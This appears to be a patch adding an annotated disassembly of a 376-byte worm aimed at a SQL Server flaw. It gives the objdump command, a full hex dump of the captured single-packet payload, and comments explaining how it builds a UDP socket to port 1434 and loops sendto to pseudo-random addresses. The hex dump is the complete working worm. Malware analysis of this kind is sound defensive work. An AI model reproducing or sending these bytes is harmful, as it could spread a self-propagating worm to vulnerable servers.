@@ -1,0 +1,292 @@
+this worm is completely contained inside its 376 byte payload; 
+i disassembled the code itself (search for "start here") after
+the nops to find out what it does.  there are some annotations;
+most should make sense but feel free to let me know if i'm 
+way off.
+
+the short story: it sends copies of itself to everyone.
+it does not store anything on the file system or even change
+anything directly.  i do not know where the flaw in sqlserver
+is, although it seems like this is pretty well known already
+(for instance, there is a similar exploit at 
+http://www.ysgnet.com/hn/exploits/adv_win32_shellcode.txt)
+shutting down sqlserver will completely stop this (although
+you will still be vulnerable again, of course)
+
+this was disassembled from www.boredom.org/~cstone/onepacket
+which is a pcap capture of a single packet.
+
+if you don't know how to work objdump, here's how:
+objdump -s -m i386 -b binary -z --disassemble-all --start-address 0xc0 --show-raw-insn duh.pcap
+
+--cstone@pobox.com
+
+duh.pcap:     file format binary
+
+Contents of section .data:
+ 0000 d4c3b2a1 02000400 00000000 00000000  ÔÃēĄ............
+ 0010 88130000 01000000 0d40323e ff7b0200  .........@2>ĸ{..
+ 0020 a2010000 a2010000 00e08121 e1660005  Ē...Ē....ā.!áf..
+ 0030 dd79e870 08004500 01943127 00007411  Ýyčp..E...1'..t.
+ 0040 53ce9320 8178d1a6 da240fb0 059a0180  SÎ. .xŅĶÚ$.°....
+ 0050 65370401 01010101 01010101 01010101  e7..............
+ 0060 01010101 01010101 01010101 01010101  ................
+ 0070 01010101 01010101 01010101 01010101  ................
+ 0080 01010101 01010101 01010101 01010101  ................
+ 0090 01010101 01010101 01010101 01010101  ................
+ 00a0 01010101 01010101 01010101 01010101  ................
+ 00b0 010101dc c9b042eb 0e010101 01010101  ...ÜÉ°Bë........
+ 00c0 70ae4201 70ae4290 90909090 90909068  pŪB.pŪB........h
+ 00d0 dcc9b042 b8010101 0131c9b1 1850e2fd  ÜÉ°Bļ....1Éą.Pâý
+ 00e0 35010101 055089e5 51682e64 6c6c6865  5....P.åQh.dllhe
+ 00f0 6c333268 6b65726e 51686f75 6e746869  l32hkernQhounthi
+ 0100 636b4368 47657454 66b96c6c 51683332  ckChGetTfđllQh32
+ 0110 2e646877 73325f66 b9657451 68736f63  .dhws2_fđetQhsoc
+ 0120 6b66b974 6f516873 656e64be 1810ae42  kfđtoQhsendū..ŪB
+ 0130 8d45d450 ff16508d 45e0508d 45f050ff  .EÔPĸ.P.EāP.EðPĸ
+ 0140 1650be10 10ae428b 1e8b033d 558bec51  .Pū..ŪB....=U.ėQ
+ 0150 7405be1c 10ae42ff 16ffd031 c9515150  t.ū..ŪBĸ.ĸÐ1ÉQQP
+ 0160 81f10301 049b81f1 01010101 518d45cc  .ņ.....ņ....Q.EĖ
+ 0170 508b45c0 50ff166a 116a026a 02ffd050  P.EĀPĸ.j.j.j.ĸÐP
+ 0180 8d45c450 8b45c050 ff1689c6 09db81f3  .EÄP.EĀPĸ..Æ.Û.ó
+ 0190 3c61d9ff 8b45b48d 0c408d14 88c1e204  <aŲĸ.Eī..@...Áâ.
+ 01a0 01c2c1e2 0829c28d 049001d8 8945b46a  .ÂÁâ.)Â....Ø.Eīj
+ 01b0 108d45b0 5031c951 6681f178 01518d45  ..E°P1ÉQf.ņx.Q.E
+ 01c0 03508b45 ac50ffd6 ebca               .P.EŽPĸÖëĘ      
+Disassembly of section .data:
+
+00000000 <.data>:
+   0:	d4 c3                	aam    $0xffffffc3
+   2:	b2 a1                	mov    $0xa1,%dl
+   4:	02 00                	add    (%eax),%al
+   6:	04 00                	add    $0x0,%al
+   8:	00 00                	add    %al,(%eax)
+   a:	00 00                	add    %al,(%eax)
+   c:	00 00                	add    %al,(%eax)
+   e:	00 00                	add    %al,(%eax)
+  10:	88 13                	mov    %dl,(%ebx)
+  12:	00 00                	add    %al,(%eax)
+  14:	01 00                	add    %eax,(%eax)
+  16:	00 00                	add    %al,(%eax)
+  18:	0d 40 32 3e ff       	or     $0xff3e3240,%eax
+  1d:	7b 02                	jnp    0x21
+  1f:	00 a2 01 00 00 a2    	add    %ah,0xa2000001(%edx)
+  25:	01 00                	add    %eax,(%eax)
+  27:	00 00                	add    %al,(%eax)
+  29:	e0 81                	loopne 0xffffffac
+  2b:	21 e1                	and    %esp,%ecx
+  2d:	66                   	data16
+  2e:	00 05 dd 79 e8 70    	add    %al,0x70e879dd
+  34:	08 00                	or     %al,(%eax)
+  36:	45                   	inc    %ebp
+  37:	00 01                	add    %al,(%ecx)
+  39:	94                   	xchg   %eax,%esp
+  3a:	31 27                	xor    %esp,(%edi)
+  3c:	00 00                	add    %al,(%eax)
+  3e:	74 11                	je     0x51
+  40:	53                   	push   %ebx
+  41:	ce                   	into   
+  42:	93                   	xchg   %eax,%ebx
+  43:	20 81 78 d1 a6 da    	and    %al,0xdaa6d178(%ecx)
+  49:	24 0f                	and    $0xf,%al
+  4b:	b0 05                	mov    $0x5,%al
+  4d:	9a 01 80 65 37 04 01 	lcall  $0x104,$0x37658001
+  54:	01 01                	add    %eax,(%ecx)
+  56:	01 01                	add    %eax,(%ecx)
+  58:	01 01                	add    %eax,(%ecx)
+  5a:	01 01                	add    %eax,(%ecx)
+  5c:	01 01                	add    %eax,(%ecx)
+  5e:	01 01                	add    %eax,(%ecx)
+  60:	01 01                	add    %eax,(%ecx)
+  62:	01 01                	add    %eax,(%ecx)
+  64:	01 01                	add    %eax,(%ecx)
+  66:	01 01                	add    %eax,(%ecx)
+  68:	01 01                	add    %eax,(%ecx)
+  6a:	01 01                	add    %eax,(%ecx)
+  6c:	01 01                	add    %eax,(%ecx)
+  6e:	01 01                	add    %eax,(%ecx)
+  70:	01 01                	add    %eax,(%ecx)
+  72:	01 01                	add    %eax,(%ecx)
+  74:	01 01                	add    %eax,(%ecx)
+  76:	01 01                	add    %eax,(%ecx)
+  78:	01 01                	add    %eax,(%ecx)
+  7a:	01 01                	add    %eax,(%ecx)
+  7c:	01 01                	add    %eax,(%ecx)
+  7e:	01 01                	add    %eax,(%ecx)
+  80:	01 01                	add    %eax,(%ecx)
+  82:	01 01                	add    %eax,(%ecx)
+  84:	01 01                	add    %eax,(%ecx)
+  86:	01 01                	add    %eax,(%ecx)
+  88:	01 01                	add    %eax,(%ecx)
+  8a:	01 01                	add    %eax,(%ecx)
+  8c:	01 01                	add    %eax,(%ecx)
+  8e:	01 01                	add    %eax,(%ecx)
+  90:	01 01                	add    %eax,(%ecx)
+  92:	01 01                	add    %eax,(%ecx)
+  94:	01 01                	add    %eax,(%ecx)
+  96:	01 01                	add    %eax,(%ecx)
+  98:	01 01                	add    %eax,(%ecx)
+  9a:	01 01                	add    %eax,(%ecx)
+  9c:	01 01                	add    %eax,(%ecx)
+  9e:	01 01                	add    %eax,(%ecx)
+  a0:	01 01                	add    %eax,(%ecx)
+  a2:	01 01                	add    %eax,(%ecx)
+  a4:	01 01                	add    %eax,(%ecx)
+  a6:	01 01                	add    %eax,(%ecx)
+  a8:	01 01                	add    %eax,(%ecx)
+  aa:	01 01                	add    %eax,(%ecx)
+  ac:	01 01                	add    %eax,(%ecx)
+  ae:	01 01                	add    %eax,(%ecx)
+  b0:	01 01                	add    %eax,(%ecx)
+  b2:	01 dc                	add    %ebx,%esp
+  b4:	c9                   	leave  
+  b5:	b0 42                	mov    $0x42,%al
+  b7:	eb 0e                	jmp    0xc7
+  b9:	01 01                	add    %eax,(%ecx)
+  bb:	01 01                	add    %eax,(%ecx)
+  bd:	01 01                	add    %eax,(%ecx)
+  bf:	01 70 ae             	add    %esi,0xffffffae(%eax)
+  c2:	42                   	inc    %edx
+  c3:	01 70 ae             	add    %esi,0xffffffae(%eax)
+  c6:	42                   	inc    %edx
+  c7:	90                   	nop    
+  c8:	90                   	nop    
+  c9:	90                   	nop    
+  ca:	90                   	nop    
+  cb:	90                   	nop    
+  cc:	90                   	nop    
+  cd:	90                   	nop    
+
+
+  --- start here
+  ce:	90                   	nop    
+  cf:	68 dc c9 b0 42       	push   $0x42b0c9dc
+  d4:	b8 01 01 01 01       	mov    $0x1010101,%eax
+  d9:	31 c9                	xor    %ecx,%ecx
+  db:	b1 18                	mov    $0x18,%cl
+  dd:	50                   	push   %eax
+  de:	e2 fd                	loop   0xdd
+  e1:	35 01 01 01 05       	xor    $0x5010101,%eax
+  e5:	50                   	push   %eax
+  e6:	89 e5                	mov    %esp,%ebp
+  e8:	51                   	push   %ecx
+
+these push a mini-symbol table on the stack.
+initially it looks something like this:
+sendto00 cb
+socket00 d3
+ws2_32.d db
+ll00GetT e3
+ickCount eb
+0000kern f3
+el32.dll fb
+00000004
+^ ebp
+
+  e9:	68 2e 64 6c 6c       	push   $0x6c6c642e
+  ee:	68 65 6c 33 32       	push   $0x32336c65
+  f3:	68 6b 65 72 6e       	push   $0x6e72656b
+  f8:	51                   	push   %ecx
+  f9:	68 6f 75 6e 74       	push   $0x746e756f
+  fe:	68 69 63 6b 43       	push   $0x436b6369
+ 103:	68 47 65 74 54       	push   $0x54746547
+ 108:	66 b9 6c 6c          	mov    $0x6c6c,%cx
+ 10c:	51                   	push   %ecx
+ 10d:	68 33 32 2e 64       	push   $0x642e3233
+ 112:	68 77 73 32 5f       	push   $0x5f327377
+ 117:	66 b9 65 74          	mov    $0x7465,%cx
+ 11b:	51                   	push   %ecx
+ 11c:	68 73 6f 63 6b       	push   $0x6b636f73
+ 121:	66 b9 74 6f          	mov    $0x6f74,%cx
+ 125:	51                   	push   %ecx
+ 126:	68 73 65 6e 64       	push   $0x646e6573
+ 12b:	be 18 10 ae 42       	mov    $0x42ae1018,%esi
+
+# find sendto in ws2_32.dll
+ 130:	8d 45 d4             	lea    0xffffffd4(%ebp),%eax    ## ws2_32.dll:sendto
+ 133:	50                   	push   %eax
+ 134:	ff 16                	call   *(%esi) 
+ 136:	50                   	push   %eax # SND2
+# find GetTickCount
+ 137:	8d 45 e0             	lea    0xffffffe0(%ebp),%eax    ## GetTickCount
+ 13a:	50                   	push   %eax
+ 13b:	8d 45 f0             	lea    0xfffffff0(%ebp),%eax    ## kernel32.dll
+ 13e:	50                   	push   %eax
+ 13f:	ff 16                	call   *(%esi)
+ 141:	50                   	push   %eax # GETT
+
+
+# GetProcAddr apparently appears in different locations -- this one
+# tries both
+ 142:	be 10 10 ae 42       	mov    $0x42ae1010,%esi  # try 1 for GetProcAddress
+ 147:	8b 1e                	mov    (%esi),%ebx
+ 149:	8b 03                	mov    (%ebx),%eax
+ 14b:	3d 55 8b ec 51       	cmp    $0x51ec8b55,%eax  # is this the right proc?
+ 150:	74 05                	je     0x157 # if we're ok then go ahead
+ 152:	be 1c 10 ae 42       	mov    $0x42ae101c,%esi  # try 2 for GetProcAddress
+ 157:	ff 16                	call   *(%esi)
+ 
+ 159:	ff d0                	call   *%eax # call GetTickCount
+ 15b:	31 c9                	xor    %ecx,%ecx 
+ 15d:	51                   	push   %ecx # 
+ 15e:	51                   	push   %ecx #
+ 15f:	50                   	push   %eax # push the tick count
+
+# 0 ^ 0x9b040103 ^ 0x01010101 = 0x9a050002; this goes in 
+# little-endian; 0x59a is 1434, our port and 0002 is the family
+# (AF_INET)
+ 160:	81 f1 03 01 04 9b    	xor    $0x9b040103,%ecx
+ 166:	81 f1 01 01 01 01    	xor    $0x1010101,%ecx 
+ 16c:	51                   	push   %ecx 
+ 16d:	8d 45 cc             	lea    0xffffffcc(%ebp),%eax # socket
+ 170:	50                   	push   %eax
+ 171:	8b 45 c0             	mov    0xffffffc0(%ebp),%eax # handle; SND2
+ 174:	50                   	push   %eax
+ 175:	ff 16                	call   *(%esi)
+
+ 177:	6a 11                	push   $0x11 # protocol 17 - udp
+ 179:	6a 02                	push   $0x2  # socket type SOCK_DGRAM
+ 17b:	6a 02                	push   $0x2  # AF_INET
+ 17d:	ff d0                	call   *%eax # call socket
+ 17f:	50                   	push   %eax # push socket (SOCK) at ffffffb0(%ebp)
+ 180:	8d 45 c4             	lea    0xffffffc4(%ebp),%eax # get sendto addr
+ 183:	50                   	push   %eax
+ 184:	8b 45 c0             	mov    0xffffffc0(%ebp),%eax
+ 187:	50                   	push   %eax
+ 188:	ff 16                	call   *(%esi)
+
+
+# it is almost ready to call sendto at this point -- however, GetTickCount
+# was not sufficiently random enough for this guy, so he plays around
+# with the address a bit before finally pushing it back into 0xffffffb4(%ebp)
+# this mangling also ensures that it can loop without calling GetTickCount
+# again, and get a different address.
+# (although the quality of randomness is obviously in question here)
+ 18a:	89 c6                	mov    %eax,%esi # move sendto addr 
+ 18c:	09 db                	or     %ebx,%ebx # for mangling
+ 18e:	81 f3 3c 61 d9 ff    	xor    $0xffd9613c,%ebx
+
+# start of the loop
+ 194:	8b 45 b4             	mov    0xffffffb4(%ebp),%eax # mov addr to eax
+ 197:	8d 0c 40             	lea    (%eax,%eax,2),%ecx # mangle the address.
+ 19a:	8d 14 88             	lea    (%eax,%ecx,4),%edx
+ 19d:	c1 e2 04             	shl    $0x4,%edx
+ 1a0:	01 c2                	add    %eax,%edx
+ 1a2:	c1 e2 08             	shl    $0x8,%edx
+ 1a5:	29 c2                	sub    %eax,%edx
+ 1a7:	8d 04 90             	lea    (%eax,%edx,4),%eax
+ 1aa:	01 d8                	add    %ebx,%eax # okay done mangling
+ 1ac:	89 45 b4             	mov    %eax,0xffffffb4(%ebp)
+ 1af:	6a 10                	push   $0x10 # length of the sockaddr
+ 1b1:	8d 45 b0             	lea    0xffffffb0(%ebp),%eax # b0 is where sockaddr starts
+ 1b4:	50                   	push   %eax # push sockaddr
+ 1b5:	31 c9                	xor    %ecx,%ecx
+ 1b7:	51                   	push   %ecx # flags - none
+ 1b8:	66 81 f1 78 01       	xor    $0x178,%cx # 376 bytes; the length
+ 1bd:	51                   	push   %ecx
+ 1be:	8d 45 03             	lea    0x3(%ebp),%eax # get the beginning of the buffer
+ 1c1:	50                   	push   %eax # push addr
+ 1c2:	8b 45 ac             	mov    0xffffffac(%ebp),%eax # get socket handle
+ 1c5:	50                   	push   %eax #
+ 1c6:	ff d6                	call   *%esi # call sendto
+ 1c8:	eb ca                	jmp    0x194 # jump back and do this again
